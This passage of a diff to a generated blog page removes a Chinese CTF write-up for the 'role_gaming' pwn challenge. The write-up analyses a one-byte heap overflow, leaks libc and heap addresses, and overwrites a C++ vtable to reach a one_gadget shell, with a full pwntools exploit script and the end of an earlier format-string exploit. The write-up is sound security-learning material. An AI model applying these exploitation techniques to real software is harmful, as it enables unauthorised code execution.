class="string">'one_gadget:'</span>+hex(one)+<span class="string">"\033[0m"</span>)</span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span class="string">'change1:'</span>+hex(change1)+<span class="string">'\nchange2:'</span>+hex(change2)+ <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%0'</span>+str(change2)+<span class="string">'d%14$hhn|%0'</span>+str(change1-change2<span class="number">-1</span>)+<span class="string">'d%13$hn|'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">submit(ret_stack<span class="number">-0x110</span>,ret_stack<span class="number">-0x110</span>+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="role-gaming"><a href="#role-gaming" class="headerlink" title="role_gaming"></a>role_gaming</h1><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>因为第一次在pwn里面写到c++的程序，本来c++也不太好逆，就…稍微写的有点久？（以后逆向速度要加油~）</p>
-<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581907941776.png" width="85%" height="85%">
-
-<p>初始化：申请了一个0xA0(0xB0)大小的chunk，用来保存后面的指针</p>
-<p>下面主要就是从栈上读取一个command，用来操作游戏，大小是0xFFF，会在输入结尾处改成0</p>
-<h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581908110687.png" alt="1581908110687"></p>
-<p>最多允许new 0x13个character，其中character有两种类型：barbarian，wizzard，在C++里面来说就是，barbarian和wizard类从character继承而来。<br>申请barbarian的command格式为：“new barbarian ”+personnage，wizzard的格式为“new wizzard ”+personnage</p>
-<p>每次创建前都会调用<code>get_personnage</code>，这个函数会调用strncmp判断command中的personnage和所有character对应chunk中的personnage，其中判断时的n用的是存在chunk上的那个记录，如果有重复的personnage，会直接申请失败</p>
-<p>对比完之后开始创建character，其对应的chunk如下：<br>character：new   0xF8(0x100)<br>personnage：calloc   0x??（由输入决定）</p>
-<h4 id="barbarian："><a href="#barbarian：" class="headerlink" title="barbarian："></a>barbarian：</h4><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581908829020.png" width="60%" height="60%">
-
-<h4 id="wizzard："><a href="#wizzard：" class="headerlink" title="wizzard："></a>wizzard：</h4><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581908985082.png" width="60%" height="60%">
-
-<p>两者的初始化基本都差不多，除了Vtable和一些值可能存在不同</p>
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581910097692.png" width="60%" height="60%">
-
-<p>通过搜索personnage判断是否存在character<br>如果存在</p>
-<ul>
-<li>free personnage，并将character chunk上的指针置零</li>
-<li>delete character_ptr，并在对应记录上赋值为前一个character，character数量减一</li>
-</ul>
-<h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581910298728.png" alt="1581910298728"></p>
-<p>打印帮助信息</p>
-<h3 id="change"><a href="#change" class="headerlink" title="change"></a>change</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581911404715.png" width="60%" height="60%">
-
-<p>格式为”change “+oldpersonnage+” “+newpersonnage</p>
-<p>如果旧personnage长度大于新的，就直接strncpy到对应chunk去，如果小于则需要realloc</p>
-<h3 id="print-all"><a href="#print-all" class="headerlink" title="print all"></a>print all</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581928137419.png" width="60%" height="60%">
-
-<p>调用到对应类的虚函数来输出其内容</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>（以后碰到复杂的题一定要先写漏洞分析）</p>
-<h3 id="chunks-amp-内存操作"><a href="#chunks-amp-内存操作" class="headerlink" title="chunks&amp;内存操作"></a>chunks&amp;内存操作</h3><p>chunk：</p>
-<ol>
-<li>初始用来存储的chunk，0xA0(0xB0)大小，new出来的chunk（new是调用malloc来实现的）</li>
-<li>character chunk，0xf8(0x100)大小，calloc出来的chunk</li>
-<li>personnage chunk，大小由我们控制，不过不能为0因为程序会自动加上一个’B’或者’W’，calloc出来的chunk，内存上申请时挨着character chunk</li>
-</ol>
-<p>内存操作：</p>
-<p>除了上面申请内存的地方还有释放内存时是先free(personnage)，然后delete character chunk。在change里面还有一个realloc personnage</p>
-<h3 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h3><p>初始化时，处理输入的personnage会先调用strlen计算len，然后<code>calloc(len,1)</code>,接着存len+1在对应记录上<br>接着用<code>strncpy(chunkptr + 1,ptr, len)</code>从chunk的第2个字节处开始放置字符串</p>
-<p>此处存在1Byte overflow</p>
-<p>在change处，由于记录的len是加过1的，当我们输入的新personnage长度和记录长度相等时，也可以修改到后面一个字节</p>
-<p>前面分析的时候顺带画了一个图方便自己看：</p>
-<p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581995268256.png" alt="1581995268256"></p>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>exploit就也是堆上比较常见的构造了，这里我使用的方法是先用free modified chunk来leak内容，然后用malloc modified chunk来覆盖Vtable，具体为什么见下文</p>
-<p>最开始的时候我申请了3个barbarian(a,b,c)，此时如果使用a的overflow可以修改到b记录chunk的size低一字节，因为申请a的时候产生的overflow在topchunk上，所以不用管，主要是利用change时的overflow</p>
-<table>
-<thead>
-<tr>
-<th>0x100</th>
-<th>0x20</th>
-<th>0x100</th>
-<th>0x??</th>
-<th>0x100</th>
-<th>0x??</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td>chunk for overflow</td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>a</td>
-<td>a</td>
-<td>b</td>
-<td>b</td>
-<td>c</td>
-<td>c</td>
-</tr>
-</tbody></table>
-<p>然后我看到后面的chunk刚好大小可以设置在一个字节，所以就想能不能利用一个0x70的来fastbin attack，通过free overlap修改其fd，然而我当时没有考虑到的是，我们的chunk大小申请是通过输入的personnage长度来决定的，如果想使用修改fd来fastbin attack，当我改到fd时，这个chunk的size也被破坏了，因为0字节在初始化时就被截断了，根本无法实现，但是如果通过这个方法来extend a，从而达到泄露指针内容的话还是可以的。</p>
-<p>我就先随便申请了5个barbarian（因为之前一直在构造的时候都畏手畏脚的，这次干脆先稍微弄多一点，冗余也没事，能在限制下写出来就行XD</p>
-<table>
-<thead>
-<tr>
-<th>0x100</th>
-<th>0x20</th>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x100</th>
-<th>0x60</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>a</td>
-<td>a</td>
-<td>b</td>
-<td>b</td>
-<td>c</td>
-<td>c</td>
-<td>d</td>
-<td>d</td>
-<td>e</td>
-<td>e</td>
-</tr>
-</tbody></table>
-<p>然后就是想办法在b所处的0x160这个范围内放上libc地址和heap地址，可以通过先free d，再free b来在fastbin上放上fd，不过这个leak值得注意的是，只能leak fd和同fd一样在堆上地址结尾是8的这一行数据，因为如果填充foot，后面紧跟的就是size，只能通过刚好盖满一个chunk的size，realloc时让chunk shrink 0x10个字节，刚好把fd放在前一个chunk的foot处，此时就可以leak了</p>
-<p>当然free d之后，由于d的记录chunk在unsortedbin上，再free b的话就会让b的记录chunk fd指向d的记录chunk，而不是main_arena了，所以free d之后我又申请了一个f，如下：</p>
-<table>
-<thead>
-<tr>
-<th>0x100</th>
-<th>0x20</th>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x20</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td>fb1</td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>a</td>
-<td>a</td>
-<td>b</td>
-<td>b</td>
-<td>c</td>
-<td>c</td>
-<td>f</td>
-<td></td>
-<td>e</td>
-<td>e</td>
-<td>f</td>
-<td></td>
-</tr>
-</tbody></table>
-<p>再free b之后在b两个chunk的fd上就既有libc地址又有heap地址了，接下来的操作就只是修改和输出：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'e'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'f'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'a'</span>*<span class="number">0x17</span>+<span class="string">'\x01'</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>)</span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###extend a to get libc_base</span></span><br><span class="line">change(<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>,<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####extend a to get heap_base</span></span><br><span class="line">change(<span class="string">'A'</span>*<span class="number">0x20</span>,<span class="string">'*'</span>*(<span class="number">0x40</span>+<span class="number">0xe0</span>)+<span class="string">'\xff'</span>)<span class="comment">#low 1 byte don't care for piebase</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\xff'</span>)</span><br><span class="line">heap_base=(my_u64(p.recv(<span class="number">5</span>))&lt;&lt;<span class="number">8</span>)<span class="number">-0x12500</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'heap_base:'</span>+hex(heap_base) + <span class="string">"\033[0m"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>leak之后，因为fastbin attack实现不了，所以我的卡了很久，最后随便翻了一下别人的思路，知道了在堆上修改vtable这种操作，但是想要覆盖到下一个chunk去修改vtable，用前面free modified chunk的方法，我在记录chunk根本找不到合适的作为fakesize的字段，只有一个字节的overflow当然也不允许我们修改过多，于是决定试试malloc modified chunk</p>
-<p>前面用来leak的构造我就没管了，直接在后面新开一块出来用于覆盖vtable，接着我就申请了g、h、以及一个伪造vtable的i，i的personnage块上我填了一个one_gadget的值，毕竟输入6个字节的地址还是可以的</p>
-<table>
-<thead>
-<tr>
-<th>0x100</th>
-<th>0x60</th>
-<th>0x20</th>
-<th>0x100</th>
-<th>0x30</th>
-<th>0x100</th>
-<th>0x30</th>
-<th>0x100</th>
-<th>0x20</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-<td>one_gadget</td>
-</tr>
-<tr>
-<td>e</td>
-<td>e</td>
-<td>f</td>
-<td>g</td>
-<td>g</td>
-<td>h</td>
-<td>h</td>
-<td>i</td>
-<td>i</td>
-</tr>
-</tbody></table>
-<p>先free掉g，然后利用f修改g的size为0x150，再change h为0x140+p64(fake vtable)即可malloc到g+h前面0x18字节的chunk，刚好可以修改h的vtable，这里其实我发现前面的构造也不一定要申请f，直接change一个说不定就可以了</p>
-<p>修改之后print all即可调用</p>
-<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./role_gaming'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'new barbarian '</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'delete '</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(nameo,namen)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'change '</span>+nameo+<span class="string">' '</span>+namen)</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'e'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'d'</span>*<span class="number">0x50</span>)</span><br><span class="line">new(<span class="string">'f'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'a'</span>*<span class="number">0x17</span>+<span class="string">'\x01'</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>)</span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'b'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###extend a to get libc_base</span></span><br><span class="line">change(<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x61'</span>,<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####extend a to get heap_base</span></span><br><span class="line">change(<span class="string">'A'</span>*<span class="number">0x20</span>,<span class="string">'*'</span>*(<span class="number">0x40</span>+<span class="number">0xe0</span>)+<span class="string">'\xff'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'successfully\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\xff'</span>)</span><br><span class="line">heap_base=(my_u64(p.recv(<span class="number">5</span>))&lt;&lt;<span class="number">8</span>)<span class="number">-0x12500</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'heap_base:'</span>+hex(heap_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"><span class="comment">####extend a to get heap_base</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL</span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">new(<span class="string">'g'</span>*<span class="number">0x30</span>)</span><br><span class="line">new(<span class="string">'h'</span>*<span class="number">0x30</span>)</span><br><span class="line">new(<span class="string">'xxxxxxx'</span>+p64(libc_base+<span class="number">0xf02a4</span>))</span><br><span class="line">delete(<span class="string">'B'</span>+<span class="string">'g'</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'f'</span>*<span class="number">0x17</span>+<span class="string">'\x01'</span>,<span class="string">'F'</span>*<span class="number">0x18</span>+<span class="string">'\x51'</span>)</span><br><span class="line">change(<span class="string">'B'</span>+<span class="string">'h'</span>*<span class="number">0x30</span>,<span class="string">'+'</span>*<span class="number">0x140</span>+p64(heap_base+<span class="number">0x12b28</span>))</span><br><span class="line">p.sendline(<span class="string">'print all'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1980,14 +1735,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
